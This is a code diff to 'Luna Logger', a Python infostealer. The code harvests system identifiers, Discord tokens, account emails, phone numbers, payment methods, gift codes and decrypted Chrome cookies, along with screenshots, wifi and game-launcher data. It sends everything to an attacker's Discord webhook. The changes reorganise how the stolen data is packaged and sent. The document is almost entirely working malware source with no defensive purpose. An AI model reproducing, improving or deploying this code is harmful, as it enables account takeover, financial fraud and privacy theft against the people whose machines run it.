@@ -25,13 +25,7 @@ __PING__ = "%ping_enabled%"
 __PINGTYPE__ = "%ping_type%"
 
 def main(webhook: str):
-    global embed
-
     webhook = SyncWebhook.from_url(webhook, session=requests.Session())
-    embed = Embed(title="Luna Logger", color=5639644)
-
-    get_inf()
-    grabtokens()
 
     threads = [ss, chrome, grabwifi, mc_tokens, epicgames_data, mfa_codes]
 
@@ -43,9 +37,6 @@ def main(webhook: str):
             t.join()
         except RuntimeError:
             continue
-
-    embed.set_footer(text="Luna Logger | Created by Smug")
-    embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
 
     zipup()
 
@@ -59,12 +50,10 @@ def main(webhook: str):
         elif __PINGTYPE__ == "here":
             content += "@here"
 
-    webhook.send(
-        content=content,
-        embed=embed,
-        file=_file,
-        avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
-        username="Luna")
+    webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+    
+    grabpcinfo()
+    grabtokens()
 
 def Luna(webhook: str):
     debug()
@@ -84,12 +73,24 @@ def try_extract(func):
             pass
     return wrapper
 
-def get_inf():
-    computer_os = platform.platform()
-    cpu = wmi.WMI().Win32_Processor()[0]
-    gpu = wmi.WMI().Win32_VideoController()[0]
-    ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
-    embed.add_field(name="SYSTEM INFO", value=f'''💻 `PC Username:` **{username}**\n<:computer_2:996126609650225322> `PC Name:` **{hostname}**\n🌐 `OS:` **{computer_os}**\n\n👀 `IP:` **{ip}**\n🍏 `MAC:` **{mac}**\n🔧 `HWID:` **{hwid}**\n<:cpu:996126314555768882> `CPU:` **{cpu.Name}**\n<:gpu:996126996952272906> `GPU:` **{gpu.Name}**\n<:rgbram:996127801025495081> `RAM:` **{ram}GB**''', inline=False)
+class grabpcinfo():
+    def __init__(self) -> None:
+        self.get_inf(__WEBHOOK__)
+
+    def get_inf(self, webhook):
+        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
+        embed = Embed(title="Luna Logger", color=5639644)
+
+        computer_os = platform.platform()
+        cpu = wmi.WMI().Win32_Processor()[0]
+        gpu = wmi.WMI().Win32_VideoController()[0]
+        ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
+
+        embed.add_field(name="System Info", value=f'''💻 `PC Username:` **{username}**\n<:computer_2:996126609650225322> `PC Name:` **{hostname}**\n🌐 `OS:` **{computer_os}**\n\n👀 `IP:` **{ip}**\n🍏 `MAC:` **{mac}**\n🔧 `HWID:` **{hwid}**\n\n<:cpu:996126314555768882> `CPU:` **{cpu.Name}**\n<:gpu:996126996952272906> `GPU:` **{gpu.Name}**\n<:rgbram:996127801025495081> `RAM:` **{ram}GB**''', inline=False)
+        embed.set_footer(text="Luna Logger | Created by Smug")
+        embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
+
+        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
 class grabtokens():
     def __init__(self) -> None:
@@ -98,11 +99,12 @@ class grabtokens():
         self.roaming = os.getenv("appdata")
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
+        self.tokens_sent = []
         self.tokens = []
         self.ids = []
 
         self.grabTokens()
-        self.upload()
+        self.upload(__WEBHOOK__)
 
     def decrypt_val(self, buff, master_key) -> str:
         try:
@@ -200,7 +202,6 @@ class grabtokens():
                                     self.tokens.append(token)
                                     self.ids.append(uid)
 
-
         if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                 for _file in files:
@@ -221,25 +222,31 @@ class grabtokens():
                                     self.tokens.append(token)
                                     self.ids.append(uid)
 
-    def upload(self):
+    def upload(self, webhook):
+        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
+
         for token in self.tokens:
+            if token in self.tokens_sent:
+                pass
+
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                     'Content-Type': 'application/json',
                     'Authorization': token}
-            val_name = ""
             val = ""
 
-            r = requests.get('https://discord.com/api/v9/users/@me',headers=headers)
+            r = requests.get(self.baseurl,headers=headers).json()
 
-            discord_id = r.json()['id']
-            username = r.json()['username'] + '#' + r.json()['discriminator']
-            phone = r.json()['phone']
-            email = r.json()['email']
+            username = r['username'] + '#' + r['discriminator']
+            discord_id = r['id']
+            avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.png"
+            phone = r['phone']
+            email = r['email']
+            
 
-            val_name += f'{username}'
+            embed = Embed(title=username, color=5639644)
 
             try:
-                if r.json()['mfa_enabled']:
+                if r['mfa_enabled']:
                     mfa = "✅"
                 else:
                     mfa = "❌"
@@ -247,21 +254,21 @@ class grabtokens():
                 mfa = "❌"
 
             try:
-                if r.json()['premium_type'] == 1:
+                if r['premium_type'] == 1:
                     nitro = 'Nitro Classic'
-                elif r.json()['premium_type'] == 2:
+                elif r['premium_type'] == 2:
                     nitro = 'Nitro Boost'
             except BaseException:
                 nitro = 'None'
 
-            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources",headers=headers)
+            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources",headers=headers).json()
 
-            if b.json() == []:
+            if b == []:
                 methods = "None"
             else:
                 methods = ""
                 try:
-                    for method in b.json():
+                    for method in b:
                         if method['type'] == 1: 
                             methods += "💳"
                         elif method['type'] == 2: 
@@ -290,7 +297,11 @@ class grabtokens():
                 for c, t in val_codes:
                     val += f'\n:gift: `{t}:`\n**{c}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
 
-            embed.add_field(name=val_name, value=val + "\u200b", inline=False)
+            embed.add_field(name="Discord Info", value=val + "\u200b", inline=False)
+            embed.set_thumbnail(url=avatar)
+
+            webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+            self.tokens_sent += token
 
 def ss():
     ImageGrab.grab(
@@ -375,14 +386,12 @@ class chrome():
                 conn = sqlite3.connect("Cookievault.db")
                 cursor = conn.cursor()
                 with open(google_cookies, "a", encoding="utf-8") as f:
-                    for result in cursor.execute(
-                            "SELECT host_key, name, encrypted_value from cookies"):
-                        host, name, value = result
+                    for result in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc from cookies"):
+                        host, name, path, value, expires_utc = result
                         value = self.decrypt_password(value, self.masterkey)
                         if host and name and value != "":
-                            f.write(
-                                "Site: {:<30} | Name: {:<30} | Value: {:<30}\n".format(
-                                    host, name, value))
+                            f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
+                                host, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host.startswith('.') else 'TRUE', expires_utc, name, value))
                 cursor.close()
                 conn.close()
                 os.remove("Cookievault.db")
